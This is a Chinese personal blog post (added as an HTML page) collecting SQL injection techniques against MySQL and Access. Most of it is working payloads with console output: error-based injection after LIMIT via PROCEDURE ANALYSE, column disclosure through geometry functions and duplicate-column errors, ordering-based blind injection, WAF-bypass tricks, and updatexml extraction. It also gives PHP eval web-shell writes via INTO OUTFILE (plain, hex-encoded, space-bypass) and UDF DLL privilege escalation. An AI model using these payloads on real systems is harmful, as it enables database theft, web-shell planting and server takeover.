@@ -1,0 +1,263 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="SQL注入笔记"><meta name="keywords" content=""><meta name="author" content="Venture,undefined"><meta name="copyright" content="Venture"><title>SQL注入笔记 | Venture's Blog</title><link rel="shortcut icon" href="/my-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.5.6"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css?version=1.5.6"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  }
+} </script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#关于mysql字段名和保留字冲突的问题"><span class="toc-number">1.</span> <span class="toc-text">关于mysql字段名和保留字冲突的问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注入点在limit关键字后面的利用方法"><span class="toc-number">2.</span> <span class="toc-text">注入点在limit关键字后面的利用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注入时过滤字段名，获取不到字段名"><span class="toc-number">3.</span> <span class="toc-text">注入时过滤字段名，获取不到字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如果waf拦截了information-schema、columns、tables、database、schema等关键字或函数，且限制了union"><span class="toc-number">4.</span> <span class="toc-text">如果waf拦截了information_schema、columns、tables、database、schema等关键字或函数，且限制了union</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#写shell技巧"><span class="toc-number"></span> <span class="toc-text">写shell技巧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基于union查询的盲注"><span class="toc-number"></span> <span class="toc-text">基于union查询的盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注入点在like"><span class="toc-number"></span> <span class="toc-text">注入点在like</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#access"><span class="toc-number"></span> <span class="toc-text">access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#updatexml报错注入为什么需要字符串拼接函数拼接特殊字符，如0x7e"><span class="toc-number"></span> <span class="toc-text">updatexml报错注入为什么需要字符串拼接函数拼接特殊字符，如0x7e</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#杂"><span class="toc-number"></span> <span class="toc-text">杂</span></a></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="http://p4hcm0dlf.bkt.clouddn.com/blog/180814/B0i68K4I86.png?imageslim"></div><div class="author-info__name text-center">Venture</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">5</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container" style="background-image: url(true)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Venture's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">Home</a><a class="site-page" href="/about">About</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="post-info"><div id="post-title">SQL注入笔记</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-08-19</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p><strong>收集一些关于SQL注入的姿势，长期更新:D</strong></p>
+<hr>
+<h3 id="关于mysql字段名和保留字冲突的问题"><a href="#关于mysql字段名和保留字冲突的问题" class="headerlink" title="关于mysql字段名和保留字冲突的问题"></a>关于mysql字段名和保留字冲突的问题</h3><p>当mysql的字段名和保留字冲突的时候，sql语句中的字段名需要加上反引号<code>`来加以区别
+    select \</code>KEY` from test<br>也说明可以用`来绕过空格。</p>
+<h3 id="注入点在limit关键字后面的利用方法"><a href="#注入点在limit关键字后面的利用方法" class="headerlink" title="注入点在limit关键字后面的利用方法"></a>注入点在limit关键字后面的利用方法</h3><p>SQL语句类似下面这样：（此方法仅适用于5.0.0&lt;mysql&lt;5.6.6的版本）</p>
+<blockquote>
+<p>   SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT （注入点）</p>
+</blockquote>
+<p>mysql 5.x 的文档中的 select 的语法</p>
+<pre><code>SELECT
+[ALL | DISTINCT | DISTINCTROW ]
+  [HIGH_PRIORITY]
+  [STRAIGHT_JOIN]
+  [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]
+  [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]
+select_expr [, select_expr ...]
+[FROM table_references
+[WHERE where_condition]
+[GROUP BY {col_name | expr | position}
+  [ASC | DESC], ... [WITH ROLLUP]]
+[HAVING where_condition]
+[ORDER BY {col_name | expr | position}
+  [ASC | DESC], ...]
+[LIMIT {[offset,] row_count | row_count OFFSET offset}]
+[PROCEDURE procedure_name(argument_list)]
+[INTO OUTFILE &apos;file_name&apos; export_options
+  | INTO DUMPFILE &apos;file_name&apos;
+  | INTO var_name [, var_name]]
+[FOR UPDATE | LOCK IN SHARE MODE]]
+</code></pre><p>limit 关键字后面还有 PROCEDURE 和 INTO 关键字，into 关键字可以用来写文件，但这在本文中不重要，这里的重点是 PROCEDURE 关键字.MySQL默认可用的存储过程只有 ANALYSE </p>
+<p>PROCEDURE ANALYSE 通过分析select查询结果对现有的表的每一列给出优化的建议</p>
+<blockquote>
+<p>PROCEDURE ANALYSE的语法如下：<br>SELECT … FROM … WHERE … PROCEDURE ANALYSE([max_elements,[max_memory]])</p>
+</blockquote>
+<p>max_elements （默认值256） analyze查找每一列不同值时所需关注的最大不同值的数量.<br>analyze还用这个值来检查优化的数据类型是否该是ENUM,如果该列的不同值的数量超过了<br>max_elements值ENUM就不做为建议优化的数据类型。<br>max_memory   （默认值8192） analyze查找每一列所有不同值时可能分配的最大的内存数量v</p>
+<p>尝试用这个存储过程</p>
+<pre><code>mysql&gt; select username from user where uid&gt;0 order by uid limit 0,1 procedure analyse(1);
+ERROR 1386 (HY000): Can&apos;t use ORDER clause with this procedure
+</code></pre><p>ANALYSE支持两个参数</p>
+<pre><code>mysql&gt; select username from user where uid&gt;0 order by uid limit 0,1 procedure analyse(1,1);
+ERROR 1386 (HY000): Can&apos;t use ORDER clause with this procedure
+</code></pre><p>可以使用报错注入</p>
+<pre><code>mysql&gt; select username from user where uid&gt;0 order by uid limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
+ERROR 1105 (HY000): XPATH syntax error: &apos;:5.5.53&apos;
+mysql&gt; select username from user where uid&gt;0 order by uid limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1);
+ERROR 1105 (HY000): XPATH syntax error: &apos;:sql&apos;
+</code></pre><p>如果不支持报错注入的话，还可以基于时间注入，直接使用sleep不行，需要用BENCHMARK代替<br>    mysql&gt; select username from user where uid&gt;0 order by uid limit 0,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</p>
+<blockquote>
+<p>order by 子句后可接and和， 后的语句，而limit 后不能</p>
+</blockquote>
+<h3 id="注入时过滤字段名，获取不到字段名"><a href="#注入时过滤字段名，获取不到字段名" class="headerlink" title="注入时过滤字段名，获取不到字段名"></a>注入时过滤字段名，获取不到字段名</h3><p>常见的做法利用union搭配别名子查询，在不知道字段的时候进行注入。</p>
+<pre><code>mysql&gt; select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d;
++---+---+---+---+
+| 1 | 2 | 3 | 4 |
++---+---+---+---+
+| 1 | 2 | 3 | 4 |
++---+---+---+---+
+1 row in set (0.00 sec)  
+mysql&gt; select * from (select 1)a,(select 2)b,(select 3)c union select * from user;
++---+------+--------+
+| 1 | 2| 3  |
++---+------+--------+
+| 1 | 2| 3  |
+| 1 | a| 123456 |
+| 2 | mino | 511323 |
+| 3 | b| asd|
++---+------+--------+
+4 rows in set (0.00 sec)
+mysql&gt; select e.3 from(select * from (select 1)a,(select 2)b,(select 3)c union select * from user)e;
++--------+
+| 3  |
++--------+
+| 3  |
+| 123456 |
+| 511323 |
+| asd|
++--------+
+4 rows in set (0.00 sec)
+</code></pre><blockquote>
+<p>   <code>mysql&gt; select * from user where uid=1 union select (select e.3 from(select * from (select 1)a,(select 2)b,(select 3)c union</code><br>   <code>select * from user)e limit 1 offset 3)f,(select 1)g,(select 1)h;</code></p>
+</blockquote>
+<pre><code>    +------+----------+----------+
+| uid  | username | password |
++------+----------+----------+
+| 1| a| 123456   |
+| asd  | 1| 1|
++------+----------+----------+
+2 rows in set (0.00 sec)
+</code></pre><h3 id="如果waf拦截了information-schema、columns、tables、database、schema等关键字或函数，且限制了union"><a href="#如果waf拦截了information-schema、columns、tables、database、schema等关键字或函数，且限制了union" class="headerlink" title="如果waf拦截了information_schema、columns、tables、database、schema等关键字或函数，且限制了union"></a>如果waf拦截了information_schema、columns、tables、database、schema等关键字或函数，且限制了union</h3><blockquote>
+<p>爆库名</p>
+</blockquote>
+<p>Polygon(ls1, ls2, …)</p>
+<p>Polygon从多个LineString或WKB LineString参数 构造一个值 。如果任何参数不表示LinearRing（也就是说，不是一个封闭和简单的LineString），返回值就是NULL</p>
+<p>  如果传参不是linestring的话，就会爆错，而当如果我们传入的是存在的字段的话，就会爆出已知库、表、列。</p>
+<pre><code>mysql&gt; select uid from user where uid=1 and Polygon(uid);
+ERROR 1367 (22007): Illegal non geometric &apos;`sql`.`user`.`uid`&apos; value found during parsing
+</code></pre><p>除了Polygon外，其他同样能用来报错获取得到当前表名和字段的还有：</p>
+<pre><code>1.multiPolygon(id)
+2.multilinestring(id)
+3.GeometryCollection(id)
+4.MultiPoint(id)
+5.linestring(id)
+</code></pre><p>如果再限制使用payload长度</p>
+<pre><code>mysql&gt; select uid from user where uid=1-a();
+ERROR 1305 (42000): FUNCTION sql.a does not exist
+</code></pre><p>原理：一个库中存在不同的系统或自定义函数，如果函数不存在，他就会爆出这个库没有此函数。</p>
+<blockquote>
+<p>爆字段</p>
+</blockquote>
+<pre><code> mysql&gt; select uid from user where uid=1 and (select * from (select * from user as a join user as b)as c);
+ERROR 1060 (42S21): Duplicate column name &apos;uid&apos;
+</code></pre><p>原理:在使用别名的时候，表中不能出现相同的字段名，于是我们就利用join把表扩充成两份，在最后别名c的时候 查询到重复字段，就成功报错。</p>
+<p>同时，可以利用using爆其他字段</p>
+<pre><code>mysql&gt; select uid from user where uid=1 and (select * from (select * from user as a join user as b using(uid))as c);
+ERROR 1060 (42S21): Duplicate column name &apos;username&apos;
+mysql&gt; select uid from user where uid=1 and (select * from (select * from user as a join user as b using(uid,username))as c);
+ERROR 1060 (42S21): Duplicate column name &apos;password&apos;
+</code></pre><p><strong>参考：<a href="http://www.wupco.cn/?p=4117" target="_blank" rel="external">http://www.wupco.cn/?p=4117</a></strong></p>
+<h2 id="写shell技巧"><a href="#写shell技巧" class="headerlink" title="写shell技巧"></a>写shell技巧</h2><p>Mysql使用十六进制编码字符串替代字符串常量</p>
+<p>在MySQL中，可以使用<code>select into outfile</code>和<code>select into dumpfile</code>命令向文件系统写文件，不能重写已有的文件</p>
+<blockquote>
+<p>outfile  —- 用于导出查询得到的所有数据<br>（注意点：</p>
+<ol>
+<li>INTO OUTFILE不会覆盖文件</li>
+<li>INTO OUTFILE必须是查询语句的最后一句</li>
+<li>路径名是不能编码的，必须使用单引号）</li>
+</ol>
+<p>dumpfile —- 用于导出一条数据，通常写入第二条的时候出错，但第二条内容已被写入文件，允许写二进制文件（INTO DUMPFILE函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择<br>当我们在UDF提权的场景是需要上传二进制文件等等用OUTFILE函数是不能成功的）</p>
+<p>load_file—- 读取文件所有内容</p>
+</blockquote>
+<p>windows操作系统的下反斜杠会被忽略，用正斜杆才能创建到对应的目录。</p>
+<pre><code>mysql&gt; select username from user into outfile  &apos;E:/tool/phpstudy/MySQL/123.txt&apos;;
+Query OK, 3 rows affected (0.00 sec)
+
+mysql&gt; select username from user into dumpfile  &apos;E:/tool/phpstudy/MySQL/111.txt&apos;;
+ERROR 1172 (42000): Result consisted of more than one row
+
+mysql&gt; select load_file(&quot;E:/tool/phpstudy/MySQL/123.txt&quot;);
++---------------------------------------------+
+| load_file(&quot;E:/tool/phpstudy/MySQL/123.txt&quot;) |
++---------------------------------------------+
+| 1234
+mino
+a
+|
++---------------------------------------------+
+1 row in set (0.28 sec)
+
+mysql&gt; select load_file(&quot;E:/tool/phpstudy/MySQL/111.txt&quot;);
++---------------------------------------------+
+| load_file(&quot;E:/tool/phpstudy/MySQL/111.txt&quot;) |
++---------------------------------------------+
+| 1234mino                                    |
++---------------------------------------------+
+1 row in set (0.00 sec)
+</code></pre><p>outfile 采用tab制表符，来区分字段,会转义换行符;dumpfile 函数不对任何列或行进行终止，也不执行任何转义处理</p>
+<p>支持union的时候:</p>
+<pre><code>id=1 union select 1,2,&apos;&lt;?php @eval($_POST[&apos;c&apos;]); ?&gt;’ into outfile ‘/var/www/html/phpinfo.php’%23
+</code></pre><p>如果有过滤，可以转换成16进制绕过。</p>
+<pre><code>id=1 union select 1,2,0x3c3f70687020406576616c28245f504f53545b2763275d293b203f3e into outfile ‘/var/www/html/phpinfo.php’%23
+</code></pre><p>如果一句话中空格被过滤掉，可以利用outfile写文件产生的制表符来绕过。</p>
+<pre><code>id=1 union select &apos;&lt;?php&apos;,&apos;@eval($_POST[&apos;c&apos;]);?&gt;&apos;,&apos;3’ into outfile ‘/var/www/html/phpinfo.php’%23
+</code></pre><p>不支持union的时候:</p>
+<blockquote>
+<p>fields子句：在FIELDS子句中有三个亚子句：TERMINATED BY、 [OPTIONALLY] ENCLOSED BY和ESCAPED BY。如果指定了FIELDS子句，则这三个亚子句中至少要指定一个。</p>
+<p>（1）TERMINATED BY用来指定字段值之间的符号，例如，“TERMINATED BY ‘,’”指定了逗号作为两个字段值之间的标志。</p>
+<p>（2）ENCLOSED BY子句用来指定包裹文件中字符值的符号，例如，“ENCLOSED BY ‘ “ ‘”表示文件中字符值放在双引号之间，若加上关键字OPTIONALLY表示所有的值都放在双引号之间。</p>
+<p>（3）ESCAPED BY子句用来指定转义字符，例如，“ESCAPED BY ‘*‘”将“*”指定为转义字符，取代“\”，如空格将表示为“*N”。</p>
+</blockquote>
+<p>可以利用TERMINATED BY插入一句话，由于它是通过插入分隔符号来getshell的，所以必须查询结果有多个列</p>
+<pre><code>select * from user into outfile &apos;E:/tool/phpstudy/MySQL/555.php&apos; fields terminated by &apos;&lt;?php phpinfo();?&gt;&apos;;
+Query OK, 3 rows affected (0.28 sec)
+
+mysql&gt; select load_file(&quot;E:/tool/phpstudy/MySQL/555.php&quot;);
++-----------------------------------------------------------------------------------------------------------------------------------------+
+| load_file(&quot;E:/tool/phpstudy/MySQL/555.php&quot;) |
++-----------------------------------------------------------------------------------------------------------------------------------------+
+| 1&lt;?php phpinfo();?&gt;a&lt;?php phpinfo();?&gt;123456
+2&lt;?php phpinfo();?&gt;mino&lt;?php phpinfo();?&gt;511323
+3&lt;?php phpinfo();?&gt;b&lt;?php phpinfo();?&gt;asd
+ |
++-----------------------------------------------------------------------------------------------------------------------------------------+
+1 row in set (0.00 sec)
+
+id=1 or 1=1 into outfile ‘/var/www/html/phpinfo.php’ fields terminated by ‘&lt;?php phpinfo(); ?&gt;’%23
+</code></pre><p>如在无web脚本 执行 但是有mysql root 执行的环境下 我们就可以 通过<br>into dump 函数导入udf.dll进行提权</p>
+<pre><code>mysql&gt; show variable like &apos;%plugin%&apos;;
+
++----------------+------------------------------------------+
+|Variable_name   | Value|
++----------------+------------------------------------------+
+| plugin_dir |c:\mysql\mysql server 5.1\lib/plugin  |
++----------------+------------------------------------------+
+</code></pre><p>mysql&gt; select unhex(‘udf.dll hex code’) into dumpfile ‘c:/mysql/mysql server 5.1/lib/plugin/xxoo.dll’;</p>
+<p>mysql&gt; select * from func; #查看是否有人创建过udf 如果有就可以省略</p>
+<p>mysql&gt; create function MyCmd returns string soname ‘’c:/mysql/mysql server 5.1/lib/plugin/xxoo.dll’;</p>
+<p>mysql&gt; select MyCmd(‘whoam’);</p>
+<p>一点小知识点:</p>
+<p>如何获取该udf.dll文件的16进制值(hex)?<br>我们可以本地搭建mysql环境 找个可以用的udf.dll文件 执行下面操作</p>
+<p>mysql&gt; select hex(load_file (‘c:/windows/temp/xxoo.dll’)) into outfile ‘c:/windows/temp/xxoo.txt’;</p>
+<p>如何获取该udf插件的内置 函数?</p>
+<p>通过C32 等16进制编辑器或直接通过记事本打开看关键字 即可。</p>
+<p><strong>参考：<a href="http://www.cnblogs.com/qing123/p/6771858.html" target="_blank" rel="external">http://www.cnblogs.com/qing123/p/6771858.html</a></strong></p>
+<h2 id="基于union查询的盲注"><a href="#基于union查询的盲注" class="headerlink" title="基于union查询的盲注"></a>基于union查询的盲注</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from admin union distinct select 1,2,0x32 order by 3 desc;</div><div class="line">+-----+-------+----------------------------------+</div><div class="line">| uid | name  | pass                             |</div><div class="line">+-----+-------+----------------------------------+</div><div class="line">|   1 | admin | 21232f297a57a5a743894a0e4a801fc3 |</div><div class="line">|   1 | 2     | 2                                |</div><div class="line">+-----+-------+----------------------------------+</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from admin union distinct select 1,2,0x33 order by 3 desc;</div><div class="line">+-----+-------+----------------------------------+</div><div class="line">| uid | name  | pass                             |</div><div class="line">+-----+-------+----------------------------------+</div><div class="line">|   1 | 2     | 3                                |</div><div class="line">|   1 | admin | 21232f297a57a5a743894a0e4a801fc3 |</div><div class="line">+-----+-------+----------------------------------+</div></pre></td></tr></table></figure>
+<p>与盲注大致相同，都是根据ASCII一位一位猜测，这是是利用MySql的字符串排序操作是从前往后一一用ascii码比对的 。我们可以控制后面的那个查询的第三个字段,让它的ASCII值最小开始变化,当查询结果第一条返回的username字段是2的时候,我们就知道这个字符的ascii码减一就是跟数据库中的相等.所以就可以一位一位的猜出来password字段了 </p>
+<p>这样的利用场景在于过滤规则严格，如过滤了括号，导致无法使用函数，过滤了需要查询的字段名</p>
+<p><strong>参考：<a href="http://wonderkun.cc/index.html/?cat=1&amp;paged=7" target="_blank" rel="external">http://wonderkun.cc/index.html/?cat=1&amp;paged=7</a></strong></p>
+<h2 id="注入点在like"><a href="#注入点在like" class="headerlink" title="注入点在like"></a>注入点在like</h2><p>搜索时没顾虑参数的，如keyword=关键字：</p>
+<p>注入的参数为keyword=’ and [查询条件] and ‘%25’=’，即生成语句：</p>
+<p>select * from 表名 where 字段 like ‘%’ and [查询条件] and ‘%’=’%’</p>
+<h2 id="access"><a href="#access" class="headerlink" title="access"></a>access</h2><p>access数据库并不像mysql那样方便，可以拥有information_schema这个包含数据各种数据库，表以及字段信息的“新华字典”。</p>
+<p>虽然有一个msysobjects,但是大多情况下即使管理员也没办法读取其里的信息，因为读取它需要设置权限。</p>
+<p>测试表名 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&apos; and (select Count(*) from form1)&gt;=0 or &apos;%&apos;=&apos;</div><div class="line"></div><div class="line">&apos; and exists(select * from [cqdl]) or &apos;%&apos;=&apos;</div></pre></td></tr></table></figure>
+<p>对于access数据来说，如果不能利用msysobjects的话，我们只能暴力破解表名、字段名了，而这个往往需要一个表名字典、字段名字典。并且不能提权，写shell。</p>
+<h2 id="updatexml报错注入为什么需要字符串拼接函数拼接特殊字符，如0x7e"><a href="#updatexml报错注入为什么需要字符串拼接函数拼接特殊字符，如0x7e" class="headerlink" title="updatexml报错注入为什么需要字符串拼接函数拼接特殊字符，如0x7e"></a>updatexml报错注入为什么需要字符串拼接函数拼接特殊字符，如0x7e</h2><p>updatexml中存在特殊字符、字母时，会出现报错，报错信息为特殊字符、字母及之后的内容 。也就是说如果我们想要查询的数据是数字开头，例如 <strong>123abc</strong> ，那么查询结果只会显示 <strong>abc</strong>。所以我们会看到很多 <strong>updatexml</strong> 注入的 <strong>payload</strong> 是长这样的 <strong>and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)</strong> ,在所要查询的数据前面凭借一个特殊符号(这里的 <strong>0x7e</strong> 为符号 <strong>‘~’</strong> )。   </p>
+<p><strong>冷门的字符串处理函数绕过 </strong></p>
+<ul>
+<li><p>MAKE_SET(<em>bits</em>,<em>str1</em>,<em>str2</em>,…)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select make_set(3,&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;);</div><div class="line">+-----------------------------+</div><div class="line">| make_set(3,&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;) |</div><div class="line">+-----------------------------+</div><div class="line">| a,b                         |</div><div class="line">+-----------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>返回一个设定值 (一个包含被‘,’号分开的字字符串的字符串) ，由在<em>bits</em> 组中具有相应的比特的字符串组成。<em>str1</em> 对应比特 0, <em>str2</em> 对应比特1,以此类推。<em>str1</em>, <em>str2</em>, …中的 NULL值不会被添加到结果中。 </p>
+<p>bits应将期转为二进制，如，3为，0011,倒过来排序，则为1100,将bits后面的字符串str1,str2等，放置在这个倒过来的二进制排序中，取出值为3对应的字符串，则得到’a,b’</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select make_set(1|4,&apos;a&apos;,&apos;b&apos;,NULL,&apos;d&apos;);</div><div class="line">+--------------------------------+</div><div class="line">| make_set(1|4,&apos;a&apos;,&apos;b&apos;,NULL,&apos;d&apos;) |</div><div class="line">+--------------------------------+</div><div class="line">| a                              |</div><div class="line">+--------------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure>
+<p>1|4表示进行或运算，为0001 | 0100,得0101，倒过来排序，为1010，’a’,’b’,NULL,’d’得到的是a。null不取，只有1才取对应字符串 </p>
+<p>所以报错注入可以这样用 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select updatexml(1,make_set(3,&apos;~&apos;,(select user())),1);</div></pre></td></tr></table></figure>
+<p>还有类似的函数：lpad()、reverse()、repeat()、export_set() <strong>（lpad()、reverse()、repeat()这三个函数使用的前提是所查询的值中，必须至少含有一个特殊字符，否则会漏掉一些数据）</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select updatexml(1,reverse((select user())),1);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;@toor</div><div class="line"></div><div class="line">mysql&gt; select updatexml(1,export_set(1|2,&apos;::&apos;,(select user())),1);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;::,::,root@localhost,root@localh</div><div class="line">(EXPORT_SET(bits,on,off[,separator[,number_of_bits]]))</div><div class="line">mysql&gt; select updatexml(1,lpad(&apos;@&apos;,30,(select user())),1);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;@localhostroot@localhostr@&apos;</div><div class="line"></div><div class="line">mysql&gt; select updatexml(1,repeat((select user()),2),1);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;@localhostroot@localhost&apos;</div></pre></td></tr></table></figure>
+<p><strong>updatexml报错最多只能显示32位，需要时结合SUBSTR函数来获取数据就行了 </strong></p>
+<p><strong>参考：<a href="https://xz.aliyun.com/t/2160" target="_blank" rel="external">https://xz.aliyun.com/t/2160</a></strong></p>
+<h2 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h2><p>skip-grant-tables这行代码意思就是跳过跳过授权表，即是可以跳过密码验证直接进入数据库</p>
+<p>添加一个不限制IP用户名为test的用户，密码为abc</p>
+<p><code>grant select,insert,update,delete on *.* to &#39;test&#39;@&#39;%&#39; Identified by &quot;abc&quot;;</code></p>
+<p>删除用户test</p>
+<p><code>drop user test@&#39;%&#39;</code></p>
+<p>查看当前用户信息</p>
+<p><code>SELECT User, Host, Password FROM mysql.user</code><br>MYSQL数据库的认证密码有两种方式，MYSQL 4.1版本之前是MYSQL323加密，MYSQL 4.1和之后的版本都是MYSQLSHA1加密，MYSQL数据库中自带Old_Password（str）和Password（str）函数,它们均可以在MYSQL数据库里进行查询，前者是MYSQL323加密，后者是MYSQLSHA1方式加密。</p>
+<p><strong>DESCRIBE</strong> </p>
+<p>DESCRIBE 更多地用于获取表结构信息</p>
+<p><code>{DESCRIBE | DESC} tbl_name [col_name | wild]</code></p>
+<p>DESCRIBE is a shortcut for SHOW COLUMNS. “SHOW COLUMNS” 语法能提供更多的关于输出列的信息。</p>
+<p><code>SHOW [FULL] COLUMNS {FROM | IN} tbl_name [{FROM | IN} db_name]    [LIKE &#39;pattern&#39; | WHERE expr]</code></p>
+<p>show columns form 表名 from 数据库名或者：show columns from 数据库名.表名</p>
+<p>DESCRIBE 提供有关一个表的列信息。col<em>name 可以是一个列名或是一个包含 SQL 通配符字符 “%” 和 “</em>” 的字符串。这种情况下，输出结果将会是匹配到的列的信息。如果列名里边没有空字符或特殊字符，wild 没有必要使用引号。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; desc news tid;</div><div class="line">+-------+------------------+------+-----+---------+----------------+</div><div class="line">| Field | Type             | Null | Key | Default | Extra          |</div><div class="line">+-------+------------------+------+-----+---------+----------------+</div><div class="line">| tid   | int(10) unsigned | NO   | PRI | NULL    | auto_increment |</div><div class="line">+-------+------------------+------+-----+---------+----------------+</div><div class="line">1 row in set (0.01 sec)</div></pre></td></tr></table></figure>
+<p>可以判断字段是否存在</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql_connect(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;);</div><div class="line">mysql_select_db(&apos;demo&apos;);</div><div class="line">$test = mysql_query(&apos;Describe cdb_posts first&apos;);</div><div class="line">$test = mysql_fetch_array($test);</div></pre></td></tr></table></figure>
+<p>$test[0]返回的是该字段的名称,比如我要查询first字段,返回的就是first</p>
+<p>如果此字段不存在返回的就是NULL,通过这样可以判断一个字段是否存在</p>
+<p><strong>参考：<a href="http://www.yulegeyu.com/2017/04/16/%E5%BD%93%E8%A1%A8%E5%90%8D%E5%8F%AF%E6%8E%A7%E7%9A%84%E6%B3%A8%E5%85%A5%E9%81%87%E5%88%B0%E4%BA%86Describe%E6%97%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%83%85%E5%86%B5%E3%80%82/" target="_blank" rel="external">http://www.yulegeyu.com/2017/04/16/%E5%BD%93%E8%A1%A8%E5%90%8D%E5%8F%AF%E6%8E%A7%E7%9A%84%E6%B3%A8%E5%85%A5%E9%81%87%E5%88%B0%E4%BA%86Describe%E6%97%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%83%85%E5%86%B5%E3%80%82/</a></strong></p>
